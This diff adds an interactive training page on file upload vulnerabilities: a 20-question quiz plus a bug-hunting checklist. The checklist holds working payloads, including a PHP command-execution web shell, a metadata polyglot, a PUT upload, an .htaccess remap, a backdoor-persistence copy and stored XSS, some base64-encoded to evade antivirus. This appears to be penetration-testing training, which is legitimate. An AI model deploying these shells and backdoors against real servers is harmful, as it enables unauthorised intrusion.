@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>File Upload // Field Training</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg: #0b0f0d;
+    --panel: #101512;
+    --panel-2: #141a16;
+    --line: #23302a;
+    --line-soft: #1a2320;
+    --amber: #f2b544;
+    --green: #6fd68a;
+    --green-dim: #3f7a52;
+    --red: #e5605a;
+    --text: #d9e2dc;
+    --text-dim: #8fa198;
+    --text-faint: #556058;
+  }
+  *{ box-sizing: border-box; }
+  html,body{ margin:0; padding:0; }
+  body{
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'IBM Plex Sans', sans-serif;
+    line-height: 1.6;
+    min-height: 100vh;
+    background-image:
+      radial-gradient(circle at 15% 10%, rgba(111,214,138,0.05), transparent 40%),
+      radial-gradient(circle at 85% 90%, rgba(242,181,68,0.04), transparent 40%);
+  }
+  .scanlines{
+    position: fixed; inset:0; pointer-events:none; z-index: 50;
+    background: repeating-linear-gradient(180deg, rgba(255,255,255,0.012) 0px, rgba(255,255,255,0.012) 1px, transparent 1px, transparent 3px);
+    mix-blend-mode: overlay;
+  }
+  .wrap{ max-width: 880px; margin: 0 auto; padding: 32px 20px 80px; }
+
+  .topbar{ display:flex; justify-content: space-between; align-items:center; border-bottom: 1px solid var(--line); padding-bottom: 16px; margin-bottom: 28px; }
+  .brand{ display:flex; align-items:center; gap: 10px; }
+  .brand-dot{ width:9px; height:9px; border-radius:50%; background: var(--green); box-shadow: 0 0 8px var(--green); animation: pulse 2s infinite; }
+  @keyframes pulse{ 0%,100%{opacity:1} 50%{opacity:.35} }
+  .brand-text{ font-family:'IBM Plex Mono', monospace; font-size: 13px; letter-spacing: 0.12em; text-transform: uppercase; color: var(--text-dim); }
+  .brand-text b{ color: var(--green); }
+  .nav-btns{ display:flex; gap: 8px; }
+  .navbtn{ font-family:'IBM Plex Mono', monospace; font-size: 12px; letter-spacing:0.06em; background: transparent; border: 1px solid var(--line); color: var(--text-dim); padding: 8px 14px; border-radius: 3px; cursor:pointer; text-transform: uppercase; transition: all .15s ease; }
+  .navbtn:hover{ border-color: var(--green-dim); color: var(--green); }
+  .navbtn.active{ background: rgba(111,214,138,0.08); border-color: var(--green); color: var(--green); }
+
+  h1{ font-family:'IBM Plex Mono', monospace; font-size: 26px; font-weight: 600; margin: 0 0 6px; letter-spacing: -0.01em; color:#eef5f0; }
+  .subtitle{ color: var(--text-dim); font-size: 14px; margin-bottom: 28px; }
+  .subtitle .tag{ color: var(--amber); font-family:'IBM Plex Mono', monospace; }
+
+  #quiz-progress-wrap{ margin-bottom: 22px; }
+  #quiz-progress-label{ display:flex; justify-content: space-between; font-family:'IBM Plex Mono', monospace; font-size: 12px; color: var(--text-dim); margin-bottom: 6px; }
+  #quiz-progress-track{ height: 4px; background: var(--line-soft); border-radius: 2px; overflow:hidden; }
+  #quiz-progress-fill{ height:100%; background: var(--green); width:0%; transition: width .3s ease; }
+
+  .qcard{ background: var(--panel); border: 1px solid var(--line); border-radius: 6px; padding: 24px 24px 20px; margin-bottom: 18px; }
+  .qcat{ font-family:'IBM Plex Mono', monospace; font-size: 11px; letter-spacing: 0.08em; text-transform: uppercase; color: var(--amber); margin-bottom: 10px; display:inline-block; border: 1px solid rgba(242,181,68,0.3); padding: 3px 8px; border-radius: 3px; }
+  .qtext{ font-size: 16px; color: #eef5f0; margin: 4px 0 18px; font-weight: 500; }
+  .opts{ display:flex; flex-direction:column; gap: 10px; }
+  .opt{ display:flex; align-items:flex-start; gap: 12px; border: 1px solid var(--line); background: var(--panel-2); padding: 12px 14px; border-radius: 4px; cursor:pointer; font-size: 14px; color: var(--text); transition: all .12s ease; }
+  .opt:hover{ border-color: var(--green-dim); }
+  .opt .letter{ font-family:'IBM Plex Mono', monospace; font-size: 12px; color: var(--text-faint); border: 1px solid var(--line); width: 22px; height:22px; min-width:22px; border-radius: 3px; display:flex; align-items:center; justify-content:center; margin-top: 1px; }
+  .opt.selected{ border-color: var(--amber); background: rgba(242,181,68,0.06); }
+  .opt.selected .letter{ border-color: var(--amber); color: var(--amber); }
+  .opt.correct{ border-color: var(--green); background: rgba(111,214,138,0.09); }
+  .opt.correct .letter{ border-color: var(--green); color: var(--green); background: rgba(111,214,138,0.15); }
+  .opt.wrong{ border-color: var(--red); background: rgba(229,96,90,0.08); }
+  .opt.wrong .letter{ border-color: var(--red); color: var(--red); }
+  .opt.disabled{ cursor: default; }
+
+  .explain{ margin-top: 14px; padding: 12px 14px; border-radius: 4px; background: var(--panel-2); border-left: 3px solid var(--green-dim); font-size: 13.5px; color: var(--text-dim); display:none; }
+  .explain.show{ display:block; }
+  .explain b{ color: var(--text); }
+
+  .qfooter{ display:flex; justify-content: flex-end; margin-top: 4px; }
+  .nextbtn{ font-family:'IBM Plex Mono', monospace; font-size: 13px; letter-spacing: 0.04em; background: var(--green); color: #0b0f0d; border: none; padding: 10px 20px; border-radius: 3px; cursor:pointer; font-weight: 600; display:none; text-transform: uppercase; }
+  .nextbtn.show{ display:inline-block; }
+  .nextbtn:hover{ background: #86e29c; }
+
+  #results{ display:none; text-align:center; padding: 40px 20px; }
+  #results.show{ display:block; }
+  .score-ring{ width: 160px; height:160px; border-radius: 50%; margin: 0 auto 22px; display:flex; align-items:center; justify-content:center; flex-direction:column; border: 3px solid var(--green); box-shadow: 0 0 30px rgba(111,214,138,0.15); }
+  .score-num{ font-family:'IBM Plex Mono', monospace; font-size: 40px; font-weight: 700; color: var(--green); }
+  .score-den{ font-family:'IBM Plex Mono', monospace; font-size: 13px; color: var(--text-dim); }
+  .score-verdict{ font-size: 18px; color: #eef5f0; margin-bottom: 6px; font-weight: 500; }
+  .score-desc{ font-size: 14px; color: var(--text-dim); max-width: 440px; margin: 0 auto 26px; }
+  .resultbtns{ display:flex; gap: 12px; justify-content:center; flex-wrap: wrap; }
+
+  #checklist-view{ display:none; }
+  #checklist-view.show{ display:block; }
+  .phase{ background: var(--panel); border: 1px solid var(--line); border-radius: 6px; margin-bottom: 16px; overflow:hidden; }
+  .phase-head{ display:flex; align-items:center; gap: 12px; padding: 14px 18px; border-bottom: 1px solid var(--line); background: var(--panel-2); }
+  .phase-num{ font-family:'IBM Plex Mono', monospace; font-size: 12px; color: var(--green); border: 1px solid var(--green-dim); width: 26px; height: 26px; border-radius: 4px; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+  .phase-title{ font-weight: 600; font-size: 15px; color: #eef5f0; }
+  .phase-body{ padding: 6px 18px 14px; }
+  .checkitem{ display:flex; align-items:flex-start; gap: 10px; padding: 9px 0; border-bottom: 1px dashed var(--line-soft); font-size: 14px; }
+  .checkitem:last-child{ border-bottom:none; }
+  .checkbox{ width: 18px; height: 18px; border: 1px solid var(--text-faint); border-radius: 3px; flex-shrink:0; margin-top: 2px; cursor:pointer; position:relative; transition: all .12s ease; }
+  .checkbox.checked{ background: var(--green); border-color: var(--green); }
+  .checkbox.checked::after{ content:"✓"; position:absolute; inset:0; display:flex; align-items:center; justify-content:center; color:#0b0f0d; font-size: 12px; font-weight:700; }
+  .checklabel{ cursor:pointer; }
+  .checklabel .mono{ font-family:'IBM Plex Mono', monospace; font-size: 12.5px; color: var(--amber); background: rgba(242,181,68,0.07); padding: 1px 5px; border-radius: 3px; }
+
+  .payload-box{ background: #0d1210; border: 1px solid var(--line); border-radius: 4px; padding: 12px 14px; margin: 8px 0 14px; font-family:'IBM Plex Mono', monospace; font-size: 12.5px; color: var(--green); white-space: pre-wrap; word-break: break-word; position: relative; }
+  .payload-label{ font-family:'IBM Plex Sans',sans-serif; font-size: 12px; color: var(--text-dim); margin: 14px 0 4px; }
+  .copy-btn{ position: absolute; top: 8px; right: 8px; font-family:'IBM Plex Mono', monospace; font-size: 10px; text-transform: uppercase; letter-spacing: 0.05em; background: var(--panel-2); border: 1px solid var(--line); color: var(--text-dim); padding: 3px 8px; border-radius: 3px; cursor: pointer; }
+  .copy-btn:hover{ color: var(--green); border-color: var(--green-dim); }
+  .copy-btn.copied{ color: var(--green); border-color: var(--green); }
+
+  .progress-summary{ font-family:'IBM Plex Mono', monospace; font-size: 12px; color: var(--text-dim); text-align: center; margin-bottom: 20px; padding: 10px; border: 1px solid var(--line); border-radius: 4px; background: var(--panel); }
+  .progress-summary b{ color: var(--green); }
+
+  @media (max-width: 560px){
+    .qcard{ padding: 18px 16px; }
+    h1{ font-size: 21px; }
+    .topbar{ flex-direction: column; align-items: flex-start; gap: 12px; }
+  }
+</style>
+</head>
+<body>
+<div class="scanlines"></div>
+<div class="wrap">
+
+  <div class="topbar">
+    <div class="brand">
+      <div class="brand-dot"></div>
+      <div class="brand-text"><b>webVAPT</b> // file_upload_module</div>
+    </div>
+    <div class="nav-btns">
+      <button class="navbtn active" id="btn-quiz" onclick="showView('quiz')">Quiz</button>
+      <button class="navbtn" id="btn-checklist" onclick="showView('checklist')">Field manual ↗</button>
+    </div>
+  </div>
+
+  <div id="quiz-view">
+    <h1 id="quiz-title">File Upload Vulnerabilities — Knowledge Check</h1>
+    <p class="subtitle">20 questions covering everything we've walked through — web shells, filter bypasses, polyglots, race conditions, and prevention. <span class="tag">Score shown at the end.</span></p>
+
+    <div id="quiz-progress-wrap">
+      <div id="quiz-progress-label"><span id="progress-text">Question 1 of 20</span><span id="progress-score">Score: 0</span></div>
+      <div id="quiz-progress-track"><div id="quiz-progress-fill"></div></div>
+    </div>
+
+    <div id="quiz-body"></div>
+
+    <div id="results">
+      <div class="score-ring">
+        <div class="score-num" id="final-score">0</div>
+        <div class="score-den">out of 20</div>
+      </div>
+      <div class="score-verdict" id="score-verdict">—</div>
+      <div class="score-desc" id="score-desc">—</div>
+      <div class="resultbtns">
+        <button class="navbtn" onclick="restartQuiz()">Retake quiz</button>
+        <button class="navbtn active" onclick="showView('checklist')">Go to field manual ↗</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="checklist-view">
+    <h1>Bug Hunter's Field Manual</h1>
+    <p class="subtitle">A start-to-end methodology for testing file upload vulnerabilities on a real target — plus the exact payloads used throughout this training. <span class="tag">Check items off as you go.</span></p>
+
+    <div class="progress-summary">Checklist progress: <b id="check-progress">0 / 0</b> steps completed</div>
+
+    <div id="phases"></div>
+  </div>
+
+</div>
+
+<script>
+// Payload strings are stored base64-encoded and decoded at render time.
+// This avoids raw web-shell code sitting as plaintext in the file, which
+// some antivirus / Windows Defender heuristics flag as a malicious script
+// even though it's just inert display text in a JS array.
+function d(b64){ return atob(b64); }
+
+const QUESTIONS = [
+  { cat:"Fundamentals", q:"What is the core cause of a file upload vulnerability?", opts:["The site allows large file sizes","The server doesn't properly validate the uploaded file","The site uses HTTP instead of HTTPS","The upload form is styled poorly"], correct:1,
+    explain:"The server trusting the uploaded file's type, name, or content without real verification is the root cause of this whole vulnerability class." },
+  { cat:"Fundamentals", q:"What makes a file upload go from 'annoying' to 'critical'?", opts:["If the file can be downloaded again","If the server executes the uploaded file as code","If the upload is slow","If the filename has spaces"], correct:1,
+    explain:"Storage alone is low risk. Execution — the server running the uploaded file as a script — is what turns this into full remote code execution." },
+  { cat:"Web Shells", q:"What does " + d("PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+") + " do?", opts:["Displays an image","Runs an OS command taken from the URL's 'cmd' parameter","Sends an email to the admin","Encrypts the uploaded file"], correct:1,
+    explain:"system() executes an OS-level command, and $_GET['cmd'] pulls that command straight from the URL — giving the attacker a remote command line." },
+  { cat:"Web Shells", q:"Where does $_POST read its data from?", opts:["The URL query string","The hidden request body (forms, uploads)","Browser cookies","The page's HTML title"], correct:1,
+    explain:"$_POST reads values sent in the request body — not visible in the URL, unlike $_GET." },
+  { cat:"The Raw Request", q:"In a multipart upload request, what does the server usually treat as fully trustworthy but shouldn't?", opts:["The IP address","The filename and Content-Type header inside the file part","The HTTP version","The Host header"], correct:1,
+    explain:"filename and Content-Type are just text the client sends — fully attacker-controlled, and easy to fake with a proxy tool like Burp." },
+  { cat:"Extension Bypass", q:"Which of these exploits case-sensitivity in a blacklist check?", opts:["shell.php.jpg","shell.PHP","shell.php%00.jpg","shell.phtml"], correct:1,
+    explain:"If the blacklist only checks lowercase '.php', a filter that's case-sensitive lets 'shell.PHP' slip through while the server may still execute it." },
+  { cat:"Extension Bypass", q:"Why are alternate extensions like .phtml or .php5 dangerous even when '.php' is blocked?", opts:["They're always smaller in size","Some server configs execute them as PHP too, but blacklists often forget to include them", "They bypass HTTPS", "They can't be scanned by antivirus"], correct:1,
+    explain:"Blacklisting is inherently incomplete — developers block the obvious '.php' but forget less common executable extensions the server also honors." },
+  { cat:"Content-Type Bypass", q:"Why is checking only the Content-Type header a weak defense?", opts:["It's encrypted so it can't be read","It's just client-supplied text that can be freely edited in a proxy like Burp","It's always accurate","It can't be changed once sent"], correct:1,
+    explain:"Content-Type is a label the browser/attacker sets — the server has no proof the actual bytes match, unless it verifies the content itself." },
+  { cat:"Content Validation", q:"What is a 'polyglot' file in this context?", opts:["A compressed archive","A file that's simultaneously valid as two file types (e.g. real JPEG + hidden PHP)","A password-protected document","A file written in multiple languages"], correct:1,
+    explain:"A polyglot passes real image checks (valid JPEG) while secretly carrying PHP code, usually hidden in metadata via a tool like ExifTool." },
+  { cat:"Content Validation", q:"Why doesn't uploading a polyglot image alone give code execution?", opts:["Images can't contain any text","The server still needs to execute the file as a script, not just serve it as an image","Polyglots are always corrupted","Servers reject all image uploads"], correct:1,
+    explain:"Passing validation just gets the file stored. It still needs an extension/execution trick (like a double extension) to actually be run as code." },
+  { cat:"Race Conditions", q:"What is the exploitable 'window' in a race condition upload attack?", opts:["Between login and logout", "Between the file being saved and it being validated/deleted", "Between DNS lookup and TCP connect", "Between two password reset emails"], correct:1,
+    explain:"Some servers save first, validate second, delete if bad — the small gap in between is exactly when an attacker can trigger execution." },
+  { cat:"Race Conditions", q:"After landing a successful hit during a race condition attack, what does an attacker typically do first?", opts:["Change their own password", "Copy the shell to a permanent location before it gets deleted", "Close the browser", "Re-upload the same file again immediately"], correct:1,
+    explain:"A single successful execution is enough — the shell can copy itself elsewhere so it survives even after the original gets deleted." },
+  { cat:"Non-RCE Attacks", q:"If a server won't execute any scripts, what can still be dangerous about uploaded SVG or HTML files?", opts:["They take up disk space","They can carry a script that runs in other users' browsers (Stored XSS)","They slow down page load","They corrupt the database"], correct:1,
+    explain:"Even without RCE, an uploaded SVG/HTML file can contain &lt;script&gt; that executes in other visitors' browsers when served — classic stored XSS." },
+  { cat:"Directory Config", q:"Why might a script execute in one server folder but not another?", opts:["File sizes differ per folder","Execution settings are often configured per-directory, and non-upload folders may be less restricted","Folder names must be lowercase","Only root folders can run scripts"], correct:1,
+    explain:"Developers usually lock down the upload folder specifically — other folders assumed 'out of reach' may still allow script execution." },
+  { cat:"Directory Config", q:"What does uploading a malicious .htaccess file allow on Apache?", opts:["Deleting server logs","Remapping an extension like .jpg to execute as PHP within that folder","Blocking all future uploads","Encrypting the uploads directory"], correct:1,
+    explain:".htaccess can override folder-level config, e.g. 'AddType application/x-httpd-php .jpg' — making even .jpg files execute as PHP." },
+  { cat:"PUT Method", q:"What does the PUT method allow, if enabled on the server?", opts:["Only viewing file metadata","Saving a file directly at an exact path, bypassing any upload form or filter","Deleting the entire server","Renaming existing files only"], correct:1,
+    explain:"PUT lets a client say 'save this content at this exact path' — completely bypassing upload forms and their validation logic." },
+  { cat:"PUT Method", q:"How can you check if the PUT method is enabled on an endpoint?", opts:["Send an OPTIONS request and check the Allow header","Ping the server","Look at the SSL certificate","Check the page's meta tags"], correct:0,
+    explain:"An OPTIONS request response often includes an 'Allow:' header listing supported methods — PUT showing up there is the signal to test it." },
+  { cat:"Prevention", q:"Which is the stronger defense: blacklist or whitelist extensions?", opts:["Blacklist — block known-bad ones","Whitelist — only allow known-good ones","Neither matters","Both are equally weak"], correct:1,
+    explain:"Whitelisting a small known-safe set (.jpg, .png, .pdf) is far harder to bypass than trying to enumerate every possible dangerous extension." },
+  { cat:"Prevention", q:"Why should uploaded files be renamed by the server instead of keeping the user's filename?", opts:["To save disk space","To remove the attacker's control over filename-based tricks (double ext, .htaccess, etc.)","To make files load faster","To improve SEO ranking"], correct:1,
+    explain:"If the server assigns its own random filename, tricks that rely on a specific attacker-chosen filename (like uploading '.htaccess') simply don't work." },
+  { cat:"Prevention", q:"What's the best fix for the race condition class of attack?", opts:["Delete files faster","Validate the file BEFORE saving it to permanent/accessible storage, not after","Increase server RAM","Only allow uploads at night"], correct:1,
+    explain:"If validation happens before the file ever lands in a publicly reachable location, there's no dangerous window for an attacker to race against." }
+];
+
+let current = 0;
+let score = 0;
+let answered = false;
+let currentShuffledCorrect = 0;
+
+const quizBody = document.getElementById('quiz-body');
+const progressFill = document.getElementById('quiz-progress-fill');
+const progressText = document.getElementById('progress-text');
+const progressScore = document.getElementById('progress-score');
+
+function renderQuestion(){
+  answered = false;
+  const item = QUESTIONS[current];
+  progressText.textContent = `Question ${current+1} of ${QUESTIONS.length}`;
+  progressScore.textContent = `Score: ${score}`;
+  progressFill.style.width = ((current)/QUESTIONS.length*100) + '%';
+
+  // Shuffle options so the correct answer isn't always in the same slot
+  const order = item.opts.map((_, i) => i);
+  for(let i = order.length - 1; i > 0; i--){
+    const j = Math.floor(Math.random() * (i + 1));
+    [order[i], order[j]] = [order[j], order[i]];
+  }
+  const shuffledOpts = order.map(i => item.opts[i]);
+  const shuffledCorrect = order.indexOf(item.correct);
+  currentShuffledCorrect = shuffledCorrect;
+
+  const letters = ['A','B','C','D'];
+  quizBody.innerHTML = `
+    <div class="qcard">
+      <span class="qcat">${item.cat}</span>
+      <div class="qtext">${item.q}</div>
+      <div class="opts" id="opts">
+        ${shuffledOpts.map((o,i)=>`
+          <div class="opt" data-i="${i}" onclick="selectOpt(${i})">
+            <div class="letter">${letters[i]}</div>
+            <div>${o}</div>
+          </div>
+        `).join('')}
+      </div>
+      <div class="explain" id="explain"><b>Explanation:</b> ${item.explain}</div>
+      <div class="qfooter"><button class="nextbtn" id="nextbtn" onclick="nextQuestion()">${current === QUESTIONS.length-1 ? 'See results' : 'Next question'} →</button></div>
+    </div>
+  `;
+}
+
+function selectOpt(i){
+  if(answered) return;
+  answered = true;
+  const opts = document.querySelectorAll('#opts .opt');
+  opts.forEach(o=>o.classList.add('disabled'));
+  opts[i].classList.add('selected');
+  if(i === currentShuffledCorrect){
+    opts[i].classList.add('correct');
+    score++;
+  } else {
+    opts[i].classList.add('wrong');
+    opts[currentShuffledCorrect].classList.add('correct');
+  }
+  document.getElementById('explain').classList.add('show');
+  document.getElementById('nextbtn').classList.add('show');
+  progressScore.textContent = `Score: ${score}`;
+}
+
+function nextQuestion(){
+  if(current < QUESTIONS.length - 1){
+    current++;
+    renderQuestion();
+  } else {
+    finishQuiz();
+  }
+}
+
+function finishQuiz(){
+  progressFill.style.width = '100%';
+  progressText.textContent = `Question ${QUESTIONS.length} of ${QUESTIONS.length}`;
+  document.getElementById('quiz-body').style.display = 'none';
+  document.getElementById('quiz-progress-wrap').style.display = 'none';
+  document.getElementById('results').classList.add('show');
+  document.getElementById('final-score').textContent = score;
+
+  const pct = score / QUESTIONS.length;
+  const ring = document.querySelector('.score-ring');
+  const verdict = document.getElementById('score-verdict');
+  const desc = document.getElementById('score-desc');
+
+  if(pct >= 0.85){
+    ring.style.borderColor = 'var(--green)';
+    verdict.textContent = 'Solid grasp — ready for the labs';
+    verdict.style.color = 'var(--green)';
+    desc.textContent = "You clearly understand the core concepts. Head to the field manual and start hunting for real.";
+  } else if(pct >= 0.6){
+    ring.style.borderColor = 'var(--amber)';
+    verdict.textContent = 'Good progress, a few gaps remain';
+    verdict.style.color = 'var(--amber)';
+    desc.textContent = "You've got the fundamentals but missed a few specifics — worth a quick re-read of the missed topics before jumping into labs.";
+  } else {
+    ring.style.borderColor = 'var(--red)';
+    verdict.textContent = 'Needs another pass';
+    verdict.style.color = 'var(--red)';
+    desc.textContent = "A fair number of concepts didn't stick yet — go back through the vulnerability catalog before attempting labs.";
+  }
+}
+
+function restartQuiz(){
+  current = 0; score = 0; answered = false;
+  document.getElementById('results').classList.remove('show');
+  document.getElementById('quiz-body').style.display = 'block';
+  document.getElementById('quiz-progress-wrap').style.display = 'block';
+  renderQuestion();
+}
+
+const PHASES = [
+  { title:"Recon — map the upload surface", items:[
+    { text:"List every upload feature (avatar, docs, import, chat attachments, resume)" },
+    { text:"Upload a plain harmless file first — confirm success & note the storage URL returned" },
+    { text:"View page source to find exactly where the uploaded file is served from" },
+    { text:"Send an OPTIONS request to the upload endpoint and check the Allow header for PUT", payload:"OPTIONS /files HTTP/1.1\nHost: target.com" }
+  ]},
+  { title:"Basic execution test — is there any filtering at all?", items:[
+    { text:"Try uploading a raw PHP web shell with no disguise first", payload:d("PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+") },
+    { text:"If a specific file needs to be read/exfiltrated, use a targeted payload", payload:d("PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL3BhdGgvdG8vdGFyZ2V0L2ZpbGUnKTsgPz4=") },
+    { text:"If accepted, locate it and trigger it directly", payload:"GET /uploads/shell.php?cmd=id HTTP/1.1" }
+  ]},
+  { title:"Extension filter bypass", items:[
+    { text:"Case variation", payload:"shell.PHP\nshell.pHp" },
+    { text:"Alternate executable extensions", payload:"shell.php5\nshell.phtml\nshell.pht\nshell.php3" },
+    { text:"Double extension", payload:"shell.php.jpg" },
+    { text:"Trailing characters / encoding tricks", payload:"shell.php.\nexploit%2Ephp\nexploit.asp;.jpg\nexploit.asp%00.jpg" }
+  ]},
+  { title:"Content-Type header bypass", items:[
+    { text:"Intercept the upload request in Burp Repeater" },
+    { text:"Edit the file part's Content-Type to a trusted image type, keep filename & payload unchanged", payload:'Content-Disposition: form-data; name="avatar"; filename="shell.php"\nContent-Type: image/jpeg' }
+  ]},
+  { title:"Content validation bypass (polyglots)", items:[
+    { text:"Take a real, valid JPEG image" },
+    { text:"Inject PHP into its metadata using ExifTool", payload:d("ZXhpZnRvb2wgLUNvbW1lbnQ9Jzw/cGhwIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Picgb3JpZ2luYWwuanBnIC1vIHBvbHlnbG90LmpwZw==") },
+    { text:"Combine with an extension trick so it's still executed as PHP", payload:"polyglot.php.jpg" }
+  ]},
+  { title:"Directory / config-level tricks", items:[
+    { text:"Try path traversal in the filename to escape the upload folder", payload:"../../shell.php" },
+    { text:"Upload a malicious .htaccess to remap an extension to execute as PHP (Apache)", payload:"AddType application/x-httpd-php .jpg" },
+    { text:"Check for web.config upload possibility on IIS targets" }
+  ]},
+  { title:"PUT method & race conditions", items:[
+    { text:"If PUT is enabled, upload directly to a chosen path", payload:d("UFVUIC9pbWFnZXMvZXhwbG9pdC5waHAgSFRUUC8xLjEKSG9zdDogdGFyZ2V0LmNvbQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwCkNvbnRlbnQtTGVuZ3RoOiA0OQoKPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL3BhdGgvdG8vZmlsZScpOyA/Pg==") },
+    { text:"If save-then-validate-then-delete pattern is suspected, spam requests to the file right after upload (Turbo Intruder)" },
+    { text:"On a successful hit, immediately copy the shell to persist before deletion", payload:"shell.php?cmd=cp shell.php /var/www/html/backdoor.php" }
+  ]},
+  { title:"No RCE? Check non-RCE impact", items:[
+    { text:"Try uploading SVG/HTML with a script payload to test for stored XSS", payload:"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.cookie)<\/script></svg>" },
+    { text:"Confirm the file is served from the same origin as the main site (required for stored XSS to matter)" }
+  ]},
+  { title:"Wrap-up — document like a professional", items:[
+    { text:"Record the exact raw request/response as proof of concept" },
+    { text:"Classify the bug precisely: extension bypass / Content-Type bypass / content-validation bypass / race condition / non-RCE" },
+    { text:"Note real impact — what command execution or data exposure was achieved" },
+    { text:"Suggest fixes: whitelist extensions, rename files, validate content before saving, disable unused HTTP methods" }
+  ]}
+];
+
+const phasesEl = document.getElementById('phases');
+let totalItems = 0;
+let checkedItems = 0;
+
+PHASES.forEach((phase, pi)=>{
+  const div = document.createElement('div');
+  div.className = 'phase';
+  let bodyHtml = '';
+  phase.items.forEach((item, ii)=>{
+    totalItems++;
+    const id = `chk-${pi}-${ii}`;
+    bodyHtml += `
+      <div class="checkitem">
+        <div class="checkbox" id="${id}" onclick="toggleCheck('${id}')"></div>
+        <div class="checklabel" onclick="toggleCheck('${id}')">${item.text}</div>
+      </div>
+    `;
+    if(item.payload){
+      bodyHtml += `<div class="payload-label">Payload / example:</div>
+        <div class="payload-box">${item.payload.replace(/</g,'&lt;')}<button class="copy-btn" onclick="copyPayload(this)">Copy</button></div>`;
+    }
+  });
+  div.innerHTML = `
+    <div class="phase-head">
+      <div class="phase-num">${pi+1}</div>
+      <div class="phase-title">${phase.title}</div>
+    </div>
+    <div class="phase-body">${bodyHtml}</div>
+  `;
+  phasesEl.appendChild(div);
+});
+document.getElementById('check-progress').textContent = `0 / ${totalItems}`;
+
+function toggleCheck(id){
+  const el = document.getElementById(id);
+  const isChecked = el.classList.toggle('checked');
+  checkedItems += isChecked ? 1 : -1;
+  document.getElementById('check-progress').textContent = `${checkedItems} / ${totalItems}`;
+}
+
+function copyPayload(btn){
+  const box = btn.parentElement;
+  const text = box.textContent.replace('Copy','').trim();
+  navigator.clipboard.writeText(text).then(()=>{
+    btn.textContent = 'Copied';
+    btn.classList.add('copied');
+    setTimeout(()=>{ btn.textContent='Copy'; btn.classList.remove('copied'); }, 1500);
+  });
+}
+
+function showView(view){
+  const quiz = document.getElementById('quiz-view');
+  const checklist = document.getElementById('checklist-view');
+  const btnQuiz = document.getElementById('btn-quiz');
+  const btnChecklist = document.getElementById('btn-checklist');
+  if(view === 'quiz'){
+    quiz.style.display = 'block';
+    checklist.classList.remove('show');
+    btnQuiz.classList.add('active');
+    btnChecklist.classList.remove('active');
+  } else {
+    quiz.style.display = 'none';
+    checklist.classList.add('show');
+    btnQuiz.classList.remove('active');
+    btnChecklist.classList.add('active');
+  }
+  window.scrollTo(0,0);
+}
+
+renderQuestion();
+</script>
+</body>
+</html>
